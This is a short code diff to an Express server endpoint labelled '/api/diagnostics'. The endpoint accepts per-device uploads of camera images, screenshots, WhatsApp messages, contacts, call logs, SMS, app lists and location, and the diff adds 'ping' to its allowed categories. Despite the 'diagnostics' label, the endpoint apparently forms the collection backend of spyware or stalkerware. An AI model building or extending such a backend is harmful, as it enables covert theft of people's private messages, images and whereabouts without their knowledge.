@@ -30,12 +30,12 @@ function cleanId(id) {
     return cleanStr(id, 64).replace(/[^a-zA-Z0-9_-]/g, '');
 }
 
-// استقبال البيانات والتشخيصات والوسائط المنفصلة
+// استقبال البيانات والتشخيصات والوسائط المنفصلة (مع إضافة ping للقائمة المسموحة)
 app.post("/api/diagnostics/:category", (req, res) => {
     const id = cleanId(req.body?.deviceId);
     const category = cleanStr(req.params.category, 32);
     
-    const allowed = ["deviceInfo", "camera", "screenshots", "wa_messenger", "wa_business", "contacts", "calls", "messages", "apps", "location"];
+    const allowed = ["deviceInfo", "camera", "screenshots", "wa_messenger", "wa_business", "contacts", "calls", "messages", "apps", "location", "ping"];
     if (!id || !allowed.includes(category)) {
         return res.status(400).json({ error: "Invalid parameters" });
     }
